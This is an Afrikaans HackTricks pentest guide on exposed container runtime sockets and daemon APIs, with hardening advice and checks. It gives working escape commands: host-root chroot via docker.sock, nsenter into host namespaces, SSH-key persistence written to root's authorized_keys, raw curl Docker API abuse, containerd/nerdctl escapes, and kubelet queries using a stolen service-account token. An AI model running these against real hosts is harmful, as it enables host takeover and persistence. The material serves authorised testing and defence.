# Runtime API En Daemon-blootstelling

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Baie werklike container-kompromitterings begin glad nie met ’n namespace escape nie. Hulle begin met toegang tot die runtime control plane. As ’n workload met `dockerd`, `containerd`, CRI-O, Podman of kubelet kan kommunikeer via ’n gemonteerde Unix-socket of ’n blootgestelde TCP-listener, kan die aanvaller moontlik ’n nuwe container met beter voorregte aanvra, die host-lêerstelsel mount, by host-namespaces aansluit of sensitiewe nodusinligting verkry. In sulke gevalle is die runtime-API die werklike sekuriteitsgrens, en die kompromittering daarvan is funksioneel na aan die kompromittering van die host.

Daarom behoort blootstelling van runtime-sockets afsonderlik van kernelbeskermings gedokumenteer te word. ’n Container met gewone seccomp, capabilities en MAC-beperking kan steeds net een API-aanroep van host-kompromittering af wees as `/var/run/docker.sock` of `/run/containerd/containerd.sock` daarin gemount is. Die kernel-isolasie van die huidige container kan presies werk soos ontwerp, terwyl die runtime-bestuursvlak steeds ten volle blootgestel is.

## Daemon-toegangsmodelle

Docker Engine stel tradisioneel sy bevoorregte API bloot via die plaaslike Unix-socket by `unix:///var/run/docker.sock`. Histories is dit ook op afstand blootgestel via TCP-listeners soos `tcp://0.0.0.0:2375` of ’n TLS-beskermde listener op `2376`. As die daemon op afstand blootgestel word sonder sterk TLS en kliëntverifikasie, verander dit die Docker-API in wese in ’n remote root-koppelvlak.

containerd, CRI-O, Podman en kubelet stel soortgelyke oppervlakke met ’n groot impak bloot. Die name en werkvloeie verskil, maar die logika nie. As die koppelvlak die oproeper toelaat om workloads te skep, host-paaie te mount, credentials te verkry of lopende containers te verander, is die koppelvlak ’n bevoorregte bestuurskanaal en moet dit dienooreenkomstig behandel word.

’n Web-UI vir containerbestuur kan dieselfde grens blootstel sonder om die plaaslike rekening direkte socket-toegang te gee. Byvoorbeeld, [Portainer-kwessie #493](https://github.com/portainer/portainer/issues/493) het ’n administrateurwagwoord-terugstelling sonder verifikasie in ’n verouderde 1.11.1-bou gedokumenteer. Behandel ’n plaaslik bereikbare UI slegs as ’n leidraad vir verdere ondersoek: bevestig die geïnstalleerde bou en verifikasiegedrag, werklike beheer oor administrateurs, en of die bestuurde endpoint containers met ’n skryfbare host-bind mount kan skep. [Portainer dokumenteer](https://docs.portainer.io/admin/environments/add/docker/socket) dat socket-gesteunde bestuur toegang tot die Docker-socket vereis; ’n rootless of beperkte endpoint verander die impak op die host. Moenie die verifikasiefout of host-root-toegang aflei uit slegs ’n prosesnaam, poort of weergawestring nie.

Algemene plaaslike paaie wat die moeite werd is om na te gaan, is:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Ouer of meer gespesialiseerde stacks kan ook endpoints soos `dockershim.sock`, `frakti.sock` of `rktlet.sock` blootstel. Dit kom minder algemeen in moderne omgewings voor, maar wanneer jy dit teëkom, moet jy dit met dieselfde omsigtigheid hanteer, omdat dit runtime-control-oppervlakke verteenwoordig eerder as gewone toepassingsockets.

## Secure Remote Access

As ’n daemon buite die plaaslike socket blootgestel moet word, moet die verbinding met TLS beskerm word en verkieslik mutual authentication gebruik, sodat die daemon die kliënt verifieer en die kliënt die daemon verifieer. Die ou gewoonte om die Docker-daemon gerieflikheidshalwe op gewone HTTP oop te stel, is een van die gevaarlikste foute in container-administrasie, omdat die API-oppervlak sterk genoeg is om bevoorregte containers direk te skep.

Die historiese Docker-konfigurasiepatroon het so gelyk:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Op systemd-gebaseerde gashere kan daemon-kommunikasie ook as `fd://` verskyn. Dit beteken dat die proses ’n vooraf oopgemaakte socket van systemd erf, eerder as om self direk daaraan te bind. Die belangrike les is nie die presiese sintaksis nie, maar die sekuriteitsgevolg. Sodra die daemon buite ’n plaaslike socket met streng toestemmings luister, is transport security en client authentication verpligtend, eerder as opsionele hardening.

## Misbruik

As ’n runtime-socket teenwoordig is, bevestig watter een dit is, of ’n versoenbare client bestaan en of toegang via rou HTTP of gRPC moontlik is:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Hierdie opdragte is nuttig omdat hulle onderskei tussen ’n dooie pad, ’n gemounte maar ontoeganklike socket en ’n lewendige bevoorregte API. As die kliënt suksesvol koppel, is die volgende vraag of die API ’n nuwe container met ’n host-bind mount of gedeelde host-namespace kan begin.

### Wanneer Geen Kliënt Geïnstalleer Is Nie

Die afwesigheid van `docker`, `podman` of ’n ander gebruikersvriendelike CLI beteken nie dat die socket veilig is nie. Docker Engine gebruik HTTP oor sy Unix-socket, en Podman stel beide ’n Docker-versoenbare API en ’n Libpod-inheemse API deur `podman system service` beskikbaar. Dit beteken dat ’n minimale omgewing met net `curl` steeds genoeg kan wees om die daemon te beheer:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Dit is belangrik tydens post-exploitation omdat verdedigers soms die gewone kliëntbinaries verwyder, maar die bestuursocket gemount laat. Onthou op Podman-gashere dat die waardevolle pad verskil tussen rootful- en rootless-ontplooiings: `unix:///run/podman/podman.sock` vir rootful-diensinstansies en `unix://$XDG_RUNTIME_DIR/podman/podman.sock` vir rootless-instansies.

### Volledige voorbeeld: Docker-socket na host root

As `docker.sock` bereikbaar is, is die klassieke ontsnapping om ’n nuwe container te begin wat die host se wortellêerstelsel mount en dan daarin te `chroot`:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Dit bied direkte uitvoering as host-root via die Docker-daemon. Die impak is nie beperk tot lêerlees nie. Sodra die aanvaller binne die nuwe container is, kan die aanvaller host-lêers verander, credentials versamel, persistence inplant of bykomende geprivilegieerde workloads begin.

### Volledige voorbeeld: Docker Socket na Host Namespaces

As die aanvaller namespace entry verkies in plaas van toegang tot slegs die filesystem:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Hierdie pad bereik die host deur die runtime te vra om ’n nuwe container met uitdruklike blootstelling van host-naamruimtes te skep, eerder as om die huidige een uit te buit.

### Docker Socket-volhardingspatroon

Runtime-beheer kan ook vir volharding gebruik word, eerder as vir ’n eenmalige shell. Die algemene patroon is om ’n helper-container met ’n host-mount te skep, gemagtigde toegangsmateriaal of ’n startup-hook na die gemounte host-lêerstelsel te skryf, en dan te bevestig dat die host dit gebruik.

Voorbeeldvorm:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Dieselfde idee kan, afhangend van wat die operator wil bewys, op systemd-eenhede, cron-brokkies, toepassing-opstartlêers of SSH-sleutels gerig word. Die belangrike punt is dat die volgehoue verandering gemaak word deur die runtime-daemon se lêerstelselgesag op gasheervlak, nie deur ekstra voorregte in die oorspronklike container nie.

### Raw Docker API Helper Pivot

Wanneer die Docker CLI ontbreek, kan dieselfde host-mount-helpervloei deur HTTP oor die Unix-sok uitgevoer word. Die algemene vloei is: bevestig die API, skep ’n helper-container met ’n host bind mount, begin dit, skep ’n exec-instansie en begin daardie exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Die finale `/exec/<id>/start`-versoek is afhanklik van die teruggestuurde exec-ID, maar die sekuriteitspunt is onafhanklik van die presiese JSON-verwerking: rou API-toegang tot ’n rootful Docker-daemon is genoeg om ’n sterker helper-werklading aan te vra.

### Volledige voorbeeld: containerd-sokkel

’n Gemonteerde `containerd`-sokkel is gewoonlik net so gevaarlik:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

As ’n meer Docker-agtige kliënt beskikbaar is, kan `nerdctl` geriefliker wees as `ctr`, omdat dit bekende flags soos `--privileged`, `--pid=host` en `-v` blootstel:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Die impak is weer kompromittering van die gasheer. Selfs as Docker-spesifieke gereedskap ontbreek, kan ’n ander runtime-API steeds dieselfde administratiewe mag bied. Op Kubernetes-nodes kan `crictl` ook genoeg wees vir verkenning en interaksie met houers, omdat dit direk met die CRI-eindpunt kommunikeer.

### BuildKit-sok

`buildkitd` is maklik om mis te kyk omdat mense dit dikwels as “net die bou-agterkant” beskou, maar die daemon is steeds ’n bevoorregte beheervlak. ’n Bereikbare `buildkitd.sock` kan ’n aanvaller toelaat om arbitrêre boustappe uit te voer, werkvermoëns te ondersoek, plaaslike kontekste uit die gekompromitteerde omgewing te gebruik en gevaarlike toestemmings, soos `network.host` of `security.insecure`, aan te vra wanneer die daemon opgestel is om dit toe te laat.

Nuttige eerste interaksies is:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

As die daemon build-versoeke aanvaar, toets of onveilige entitlements beskikbaar is:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Die presiese impak hang af van die daemon-konfigurasie, maar ’n rootful BuildKit-diens met permissiewe entitlements is nie ’n onskadelike gerief vir ontwikkelaars nie. Behandel dit as nog ’n administratiewe oppervlak met hoë waarde, veral op CI-runners en gedeelde bou-nodes.

### Kubelet-API oor TCP

Die kubelet is nie ’n container runtime nie, maar dit is steeds deel van die node-bestuursvlak en word dikwels by dieselfde bespreking oor trust boundaries ingesluit. As die kubelet se secure port `10250` vanaf die workload bereikbaar is, of as node credentials, kubeconfigs of proxy-regte blootgestel word, kan die aanvaller moontlik Pods lys, logs ophaal of opdragte uitvoer in node-local containers sonder om ooit aan die Kubernetes API-server se admission path te raak.

Begin met eenvoudige ontdekking:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

As die kubelet- of API-server-proxy-pad `exec` magtig, kan ’n WebSocket-bekwame kliënt dit omskakel in code execution in ander containers op die node. Dit is ook waarom `nodes/proxy` met slegs `get`-toestemming gevaarliker is as wat dit klink: die versoek kan steeds kubelet-eindpunte bereik wat opdragte uitvoer, en daardie direkte kubelet-interaksies verskyn nie in normale Kubernetes-ouditlogs nie.<sup>[[2]](#references)</sup>

## Kontroles

Die doel van hierdie kontroles is om vas te stel of die container enige bestuursvlak kan bereik wat buite die trust boundary moes gebly het.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Wat hier interessant is:

- ’n Gemonteerde runtime-sok is gewoonlik ’n direkte administratiewe primitief, nie bloot inligtingopenbaarmaking nie.
- ’n TCP-listener op `2375` sonder TLS moet as ’n toestand van kompromittering op afstand beskou word.
- Omgewingsveranderlikes soos `DOCKER_HOST` wys dikwels dat die workload doelbewus ontwerp is om met die host-runtime te kommunikeer.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Plaaslike Unix-sok by verstek | `dockerd` luister op die plaaslike sok en die daemon loop gewoonlik as root | montering van `/var/run/docker.sock`, blootstelling van `tcp://...:2375`, swak of ontbrekende TLS op `2376` |
| Podman | Daemonless CLI by verstek | Geen langdurige geprivilegieerde daemon is vir gewone plaaslike gebruik nodig nie; API-sokke kan steeds blootgestel word wanneer `podman system service` geaktiveer is | blootstelling van `podman.sock`, die diens wyd beskikbaar stel, rootful API-gebruik |
| containerd | Plaaslike geprivilegieerde sok | Administratiewe API word deur die plaaslike sok blootgestel en gewoonlik deur hoërvlakgereedskap gebruik | montering van `containerd.sock`, breë `ctr`- of `nerdctl`-toegang, blootstelling van geprivilegieerde naamruimtes |
| CRI-O | Plaaslike geprivilegieerde sok | CRI-eindpunt is bedoel vir vertroude komponente op die nodus | montering van `crio.sock`, blootstelling van die CRI-eindpunt aan onvertroude workloads |
| Kubernetes kubelet | Bestuurs-API plaaslik op die nodus | Kubelet behoort nie wyd vanaf Pods bereikbaar te wees nie; toegang kan pod-toestand, geloofsbriewe en uitvoeringsfunksies blootstel, afhangend van authn/authz | montering van kubelet-sokke of -sertifikate, swak kubelet-auth, host-netwerk plus ’n bereikbaar kubelet-eindpunt |

## References

- [1] [containerd-sok-exploitation deel 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server-omseilingsrisiko's](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
